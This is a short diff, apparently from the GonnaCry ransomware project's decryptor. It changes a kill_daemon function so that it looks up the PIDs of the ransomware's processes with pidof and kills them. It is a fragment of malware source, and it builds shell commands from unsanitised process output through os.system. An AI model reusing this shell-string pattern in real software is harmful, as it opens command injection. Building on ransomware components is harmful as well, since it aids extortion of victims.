@@ -46,8 +46,22 @@ machine_id = enviroment.get_unique_machine_id()
 def kill_daemon():
     process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output = process.stdout.read() + process.stderr.read()
+    process2 = subprocess.Popen("pidof gonnacry", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    pid_of_gonnacry = process2.stdout.read() + process2.stderr.read()
+    
+    process3 = subprocess.Popen("pidof python main.py", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    pid_of_gonnacry2 = process3.stdout.read() + process3.stderr.read()
+    try:
+        pid_of_gonnacry2 = pid_of_gonnacry2.split(' ')[0]
+    except: 
+        pass
+
+    os.system('kill {}'.format(pid_of_gonnacry))
+    os.system('kill {}'.format(pid_of_gonnacry2))
+    os.system('kill {}'.format(output))
     os.system("killall daemon")
     os.system('killall gonnacry')
+    
 
 
 def decrypt_aes_keys(enc, key):
